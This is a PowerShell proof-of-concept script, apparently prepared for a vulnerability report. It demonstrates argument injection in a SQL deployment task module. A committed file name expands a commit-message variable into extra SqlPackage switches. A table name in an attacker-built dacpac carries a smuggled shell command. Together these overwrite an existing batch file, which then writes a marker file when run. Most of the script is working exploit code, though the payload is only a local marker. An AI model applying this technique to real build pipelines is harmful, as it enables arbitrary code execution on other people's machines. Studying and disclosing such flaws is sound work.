# Ceiling probe 3. The written file's content is derived from the attacker's own dacpac and
# carries their chosen bytes. This asks the only question that decides the ceiling: is the
# written file, placed at a path and an extension the attacker picks, a WORKING script that
# executes their command when the machine runs it. Synthetic marker, local only.

$ErrorActionPreference = 'Continue'
$here = Split-Path -Parent $MyInvocation.MyCommand.Path
$work = Join-Path $env:RUNNER_TEMP ("c3-" + [guid]::NewGuid().ToString('N').Substring(0,8))
New-Item -ItemType Directory -Force -Path (Join-Path $work 'db') | Out-Null
New-Item -ItemType Directory -Force -Path (Join-Path $work 'victim') | Out-Null
$victimDir = Join-Path $work 'victim'
Write-Output ("PSVersion : " + $PSVersionTable.PSVersion + "   PSEdition : " + $PSVersionTable.PSEdition)
$sqlPackage = (Get-ChildItem "C:\Program Files\Microsoft SQL Server\*\DAC\bin\SqlPackage.exe" | Select-Object -First 1).FullName
Write-Output ("SqlPackage.exe  : " + $sqlPackage + "  v" + (Get-Item $sqlPackage).VersionInfo.FileVersion)

$nupkg = Join-Path $here 'taskmodulesqlutility-0.1.7.nupkg'
Copy-Item $nupkg (Join-Path $work 'pkg.zip')
Expand-Archive -Path (Join-Path $work 'pkg.zip') -DestinationPath (Join-Path $work 'pkg') -Force
$modFile = (Get-ChildItem -Recurse -Path (Join-Path $work 'pkg') -Filter 'SqlPackageOnTargetMachines.ps1' | Select-Object -First 1).FullName
Write-Output ("module sha256   : " + (Get-FileHash -Algorithm SHA256 $modFile).Hash.ToLower())
function Get-LiftedText([string]$file, [string[]]$names) {
    $tok = $null; $err = $null
    $ast = [System.Management.Automation.Language.Parser]::ParseFile($file, [ref]$tok, [ref]$err)
    $fns = $ast.FindAll({ param($n) $n -is [System.Management.Automation.Language.FunctionDefinitionAst] }, $true)
    $parts = @()
    foreach ($name in $names) {
        $f = $fns | Where-Object { $_.Name -eq $name } | Select-Object -First 1
        Write-Host ("  lifted verbatim : $name lines $($f.Extent.StartLineNumber)-$($f.Extent.EndLineNumber)")
        $parts += $f.Extent.Text
    }
    return ($parts -join "`r`n")
}
. ([scriptblock]::Create((Get-LiftedText $modFile @('Get-SqlPackageCmdArgs','ExecuteCommand'))))

& SqlLocalDB.exe create MSRCLAB3 2>&1 | Out-Null
& SqlLocalDB.exe start  MSRCLAB3 2>&1 | Out-Null
$target = '(localdb)\MSRCLAB3'
$MARK = Join-Path $victimDir 'PWNED-batch-executed.txt'
# The attacker authors the dacpac. One object name carries the command they want run.
$ddl = @"
CREATE DATABASE SrcDb;
GO
USE SrcDb;
GO
CREATE TABLE dbo.[Z& echo BATCH_MARKER_WRITTEN_BY_GENERATED_FILE> "$MARK" &] (id INT NOT NULL);
GO
"@
Set-Content -Path (Join-Path $work 'seed.sql') -Value $ddl -Encoding ASCII
& sqlcmd -S $target -i (Join-Path $work 'seed.sql') 2>&1 | Select-Object -First 4 | ForEach-Object { Write-Output ("  seed> " + $_) }
$srcDac = Join-Path $work 'db\Fab.dacpac'
& $sqlPackage '/Action:Extract' "/SourceServerName:$target" '/SourceDatabaseName:SrcDb' "/TargetFile:$srcDac" 2>&1 | Select-Object -Last 2 | ForEach-Object { Write-Output ("  extract> " + $_) }

function RunLeg([string]$label, [string]$fileName, [string]$commitMsg) {
    Write-Host ""
    Write-Host "================ $label"
    Write-Host ("  committed file name : " + $fileName)
    Write-Host ("  commit message      : " + $commitMsg)
    $env:BUILD_SOURCEVERSIONMESSAGE = $commitMsg
    $dacpac = Join-Path $work ("db\" + $fileName)
    $a = Get-SqlPackageCmdArgs -dacpacFile $dacpac -targetMethod 'server' -serverName $target -databaseName 'Fabrikam' -additionalArguments ''
    Write-Host ("  argument string     : " + $a)
    try { $out = ExecuteCommand -FileName $sqlPackage -Arguments $a } catch { $out = "$_" }
    ($out -split "`r?`n") | Where-Object { $_.Trim() } | Select-Object -First 3 | ForEach-Object { Write-Host ("  out> " + $_.Trim()) }
}

# A pre-existing batch file the machine already has. The attacker replaces it.
$bat = Join-Path $victimDir 'scheduled-task.bat'
Set-Content -Path $bat -Value '@echo off' -Encoding ASCII
Add-Content -Path $bat -Value 'echo ORIGINAL-MAINTENANCE-SCRIPT' -Encoding ASCII
Write-Output ""
Write-Output ("  pre-existing batch file : " + $bat + "   " + (Get-Item $bat).Length + " bytes")
Write-Output ("  running it BEFORE the injection:")
& cmd.exe /c "`"$bat`"" 2>&1 | Select-Object -First 4 | ForEach-Object { Write-Output ("    before> " + $_) }
Write-Output ("  marker present before   : " + (Test-Path $MARK))

$msg = '.dacpac" /DeployScriptPath:"' + $bat + '" /DiagnosticsFile:"' + (Join-Path $work 'junk')
RunLeg 'INJECT  /DeployScriptPath: aimed at an existing .bat' 'Fab%BUILD_SOURCEVERSIONMESSAGE%.dacpac' $msg

Write-Output ""
Write-Output ("  batch file AFTER the injection : " + (Get-Item $bat).Length + " bytes")
Write-Output ("  ORIGINAL LINE STILL PRESENT    : " + ((Get-Content $bat -Raw) -match 'ORIGINAL-MAINTENANCE-SCRIPT'))
(Select-String -Path $bat -Pattern 'BATCH_MARKER' | Select-Object -First 2) | ForEach-Object { Write-Output ("    hit> " + $_.Line.Trim()) }
Write-Output ""
Write-Output ("  running the replaced batch file, as the machine would:")
& cmd.exe /c "`"$bat`"" 2>&1 | Select-Object -First 8 | ForEach-Object { Write-Output ("    after> " + $_) }
Write-Output ("  MARKER FILE WRITTEN BY THE REPLACED BATCH FILE : " + (Test-Path $MARK))
if (Test-Path $MARK) { Write-Output ("    content> " + (Get-Content $MARK -Raw).Trim()) }

# control: same everything, percent signs removed from the committed file name
Write-Output ""
Write-Output "########## CONTROL, percent signs removed"
Remove-Item $MARK -Force -ErrorAction SilentlyContinue
Set-Content -Path $bat -Value '@echo off' -Encoding ASCII
Add-Content -Path $bat -Value 'echo ORIGINAL-MAINTENANCE-SCRIPT' -Encoding ASCII
RunLeg 'CONTROL percent signs removed' 'FabBUILD_SOURCEVERSIONMESSAGE.dacpac' $msg
Write-Output ("  batch file bytes : " + (Get-Item $bat).Length)
Write-Output ("  ORIGINAL LINE STILL PRESENT : " + ((Get-Content $bat -Raw) -match 'ORIGINAL-MAINTENANCE-SCRIPT'))
& cmd.exe /c "`"$bat`"" 2>&1 | Select-Object -First 4 | ForEach-Object { Write-Output ("    after> " + $_) }
Write-Output ("  MARKER FILE WRITTEN : " + (Test-Path $MARK))

Write-Output ""
Write-Output "DONE"
exit 0
